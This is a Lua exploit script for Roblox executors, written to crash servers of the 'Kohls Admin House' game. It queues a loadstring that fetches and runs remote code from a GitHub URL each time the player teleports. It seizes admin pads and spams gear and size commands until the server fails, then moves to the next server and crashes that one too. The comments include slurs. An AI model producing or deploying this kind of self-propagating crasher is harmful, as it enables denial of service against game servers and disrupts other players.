-- Autocrasher for https://www.roblox.com/games/112420803/Kohls-Admin-House-NBC, yes its open source i dont want ur retarded ip it serves no purpose to me.

-- Note: roblox will sometimes give you a random error and kick you from the game it isnt my fault. You also have to be focused on the main window for this to work since roblox have patched game.Players:Chat() (this uses a bypass)

local ont = syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport or function()
    end
ont("loadstring(game:HttpGet(('https://raw.githubusercontent.com/Korabi-dev/roblox-crasher/main/main.lua'),true))()")
 coroutine.wrap(function()
task.wait(5)
if not game:IsLoaded() then
local httpres =
                game:HttpGet(
                "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
            )
            httpres = game:GetService("HttpService"):JSONDecode(httpres)
            local servers = httpres.data
            if not servers then
                warn("Servers couldnt be fetched")
            end
            for i, server in pairs(servers) do
                if server.id ~= game.JobId and server.playing ~= server.maxPlayers then
                    game:GetService("TeleportService"):TeleportToPlaceInstance(
                        game.PlaceId,
                        server.id,
                        game:GetService("Players").LocalPlayer
                    )
                end
            end
end
end)()
local s, e =
    pcall(
    function()
        function pr(t)
            print("Kohl Smasher: " .. t .. " Loaded")
        end
        local gameFlr = game.Workspace:WaitForChild("Terrain"):WaitForChild("_Game")
        local adminFlr = gameFlr.Admin
        local plyrs = game:GetService("Players")
        local rns = game:GetService("RunService")
        local whitelisted =
            game:HttpGet("https://raw.githubusercontent.com/Korabi-dev/roblox-crasher/main/whitelisted.json")
        whitelisted = game:GetService("HttpService"):JSONDecode(whitelisted)
        if not whitelisted then
            whitelisted = {users = {}}
        end
        whitelisted = whitelisted.users
        pr("Variables")

        function notif(title, text, duration)
            local options = {
                Title = title,
                Text = text,
                Duration = duration
            }
            game:GetService("StarterGui"):SetCore("SendNotification", options)
        end
        pr("notif")

        function hop()
            local httpres =
                game:HttpGet(
                "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
            )
            httpres = game:GetService("HttpService"):JSONDecode(httpres)
            local servers = httpres.data
            if not servers then
                warn("Servers couldnt be fetched")
            end
            for i, server in pairs(servers) do
                if server.id ~= game.JobId and server.playing ~= server.maxPlayers then
                    game:GetService("TeleportService"):TeleportToPlaceInstance(
                        game.PlaceId,
                        server.id,
                        game:GetService("Players").LocalPlayer
                    )
                end
            end
        end
        pr("hop")
        function kill(msg)
            notif("Script Killed!", msg .. " | You will now be teleported to a different server", 10)
            hop() "UR FAT ASS FUCKING MOM?":Kill()
        end
        pr("kill")

        function chat(msg)
    task.wait()
    game.Players.LocalPlayer.PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar:CaptureFocus()
    game.Players.LocalPlayer.PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar.Text = msg
    game.Players:chat(msg)
    game.Players.LocalPlayer.PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar.Text = ""
    game.Players.LocalPlayer.PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar:ReleaseFocus()
    end
        pr("chat")

        function viewChat(msg)
            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                "[KohlSmasher.lua]: " .. msg,
                "All"
            )
        end
        pr("Viewable chat")
        for i, v in pairs(whitelisted) do
            if
                game:GetService("Players"):FindFirstChild(v) or
                    game:GetService("Players"):GetPlayerByUserId(
                        tonumber(v) or 99999999999999999999999999999999999999999999999999999
                    )
             then
                viewChat("Whitelisted user detected! Changing servers.")
                kill("A whitelisted player is in the server")
                hop()
            end
        end

        pr("whitelist")

        function grab()
            coroutine.wrap(
                function()
                    while task.wait() do
                        local pads = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
                        for i, pad in pairs(pads) do
                            coroutine.wrap(
                                function()
                                    pcall(
                                        function()
                                            local cre = pad.Head
                                            local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
                                            firetouchinterest(cre, spr, 0)
                                            task.wait()
                                            firetouchinterest(cre, spr, 1)

                                            if pad.Name ~= game.Players.LocalPlayer.Name .. "'s admin" then
                                                fireclickdetector(adminFlr.Regen.ClickDetector, 0)
                                            end
                                        end
                                    )
                                end
                            )()
                        end
                    end
                end
            )()
        end
        pr("grab")

        function backpack()
            coroutine.wrap(
                function()
                    while task.wait() do
                        for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                            if v.Name ~= "VampireVanquisher" then
                                return
                            end
                            local s, e =
                                pcall(
                                function()
                                    game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
                                end
                            )
                            if not s then
                                warn(e)
                            end
                        end
                    end
                end
            )()
        end

        function crash()
            grab()
            backpack()
            pr("crash grab")
            coroutine.wrap(
                function()
                    while task.wait() do
                        if not game.Players.LocalPlayer.Backpack:FindFirstChild("VampireVanquisher") then
                            chat("gear me 94794847")
                        end
                        chat("size me 0000000000000000000.3")
                    end
                end
            )()
            pr("Vamp Crash")
        end

        notif("Kohl Smasher", "Loaded.", 5)
        viewChat("This server is being crashed. Made by Korabi.")
        viewChat("I will not stop until this server dies.")
        task.wait(0.1)
        crash()
        pr("crash")
        task.wait(7)
        hop()
    end
)

if not s then
    warn(e)
end
